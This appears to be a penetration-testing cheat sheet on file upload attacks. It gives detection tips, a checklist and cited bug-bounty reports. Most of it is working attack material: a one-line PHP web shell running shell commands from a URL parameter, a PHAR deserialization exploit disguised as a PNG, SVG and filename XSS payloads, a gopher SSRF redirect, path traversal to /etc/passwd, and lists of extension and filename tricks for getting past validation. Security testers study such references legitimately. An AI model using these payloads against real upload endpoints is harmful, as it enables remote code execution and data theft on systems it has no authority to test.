---
tags:
  - critical
  - server-side
---

# File Upload Attacks

## TL;DR

Upload malicious files (shells, XSS payloads) by bypassing validation.

**Key vectors:**
- Extension manipulation
- PHAR deserialization
- SVG XSS
- Content-type spoofing
- Path traversal in filenames

## Detection

### Identify Upload Functionality

- File upload forms (images, documents, avatars)
- Import features (CSV, XML, ZIP)
- Profile/settings with media uploads
- Support ticket attachments

### Validation Indicators

- Allowed extensions in error messages
- Content-Type validation errors
- File size restrictions
- Path restrictions in errors

## Exploitation

### Extension Bypass

**Parameter Manipulation:**
```http
handler=file&logFile=/path/to/malicious.php&logging_mode=
```

**Double Extension:**
```
file.png.php
file.jpg.jsp
file.pdf.asp
```

**NULL Byte (Legacy):**
```
malicious.php%00.jpg
```

**MIME Type Spoofing:**
```http
Content-Type: image/jpeg
Content-Disposition: form-data; name="file"; filename="shell.php"

<?php system($_GET['cmd']); ?>
```

### PHAR Deserialization

**Create malicious PHAR:**
```php
$phar = new Phar("exploit.phar");
$phar->setMetadata($malicious_object);
$phar->addFromString("dummy.txt", "DUMMY");
rename("exploit.phar", "exploit.png");
```

**Trigger via file functions:**
```
phar://./uploads/exploit.png
```

Functions like `file_exists()`, `is_dir()` trigger deserialization.

### SVG XSS

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert('XSS')</script>
</svg>
```

### Filename XSS

```
filename="\"><img src=1 onerror=\"alert(1)\">"
```

### SSRF via URL Processing

```php
<?php header('Location: gopher://192.168.1.1:80/test'); ?>
```

### Path Traversal in Filename

```
filename=../../../etc/passwd
filename=..%2f..%2f..%2fetc%2fpasswd
/var/www/html/config.php  (absolute path)
```

## Bypasses

### Extension Bypasses

```
# PHP
.php, .php3, .php4, .php5, .phtml, .phar

# ASP
.asp, .aspx, .ashx, .asmx, .cer

# Java
.jsp, .jspx, .jsw, .jsv, .jspf

# Other
.svg (XSS), .html, .htm, .swf

# Case variations
.PHP, .Php, .pHP
```

### Content-Type

```
image/jpeg, image/png, image/gif
application/octet-stream
text/plain
```

### Filename Tricks

```
shell.php.jpg      # Double extension
shell.php%00.jpg   # Null byte
shell.php;.jpg     # Semicolon
shell.php:jpg      # Colon (Windows)
shell.jpg.php      # Reverse order
shell.php%20       # Trailing space
shell.php%0a       # Newline
```

### Directory Traversal

```
../               # Standard
..\/              # Mixed separators
%2e%2e%2f         # URL encoded
....//            # Doubled dots
..%5c             # Backslash encoded
```

## Checklist

1. Extension blacklist bypass (alternative extensions)
2. Extension whitelist bypass (double extensions, null bytes)
3. Content-Type validation bypass
4. File content validation bypass (magic bytes)
5. Path traversal in filename
6. Filename XSS/injection
7. File size limits
8. CSRF on upload endpoint
9. Race conditions
10. SSRF via URL-based upload

## Real Examples

- **HackerOne #841947:** Parameter manipulation bypass
- **HackerOne #921288:** PHAR deserialization via .png
- **HackerOne #1063039:** PHAR via logging settings
- **HackerOne #228377:** SSRF via image URL processing
- **HackerOne #865354:** SVG XSS upload
- **HackerOne #1010466:** Blind XSS in filename
- **HackerOne #311216:** Path traversal with `../`

## Tools

```bash
# PHP shell
<?php system($_GET['cmd']); ?>

# PHAR generator
php -d phar.readonly=0 generate_phar.php

# SVG XSS
<svg onload="alert(1)"/>
```
